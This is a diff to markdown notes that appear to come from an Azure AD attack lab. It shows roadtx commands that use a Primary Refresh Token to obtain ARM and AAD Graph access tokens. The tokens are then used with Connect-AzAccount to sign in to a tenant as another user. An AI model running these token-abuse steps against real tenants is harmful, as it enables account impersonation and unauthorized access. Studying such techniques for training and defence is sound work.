@@ -1366,15 +1366,15 @@ Another way of using PRT would be to request access tokens for ARM and MSGraph (
 In the below commands, we are requesting access tokens for ARM and MSGraph using client ID of the Az PowerShell module (Check out roadtx listaliases for more options): 
 ```
 (venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r azrm --tokens-stdout 
-(venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r msgraph --tokens-stdout
+(venv) PS C:\AzAD\Tools\ROADTools> roadtx prtauth -c azps -r aadgraph --tokens-stdout
 ```
 
 Copy the ARM and MSGraph access tokens and save them to ```$token``` and ```$msgraphaccesstoken``` as we have been doing up to now. 
 Use them to connect to the target tenant as the user Michael: 
 ```
 $token = 'eyJ0…..'
-$msgraphaccesstoken = 'eyJ0…..'
-Connect-AzAccount -AccessToken $token -MicrosoftGraphAccessToken $msgraphaccesstoken -AccountId michaelmbarron@defcorphq.onmicrosoft.com
+$aadgraph = 'eyJ0…..'
+Connect-AzAccount -AccessToken $token -GraphAccessToken $aadgraph -AccountId michaelmbarron@defcorphq.onmicrosoft.com
 ```
 
 We can now use the Az PowerShell module as usual (Note that Michael doesn’t have any permissions on Azure resources):
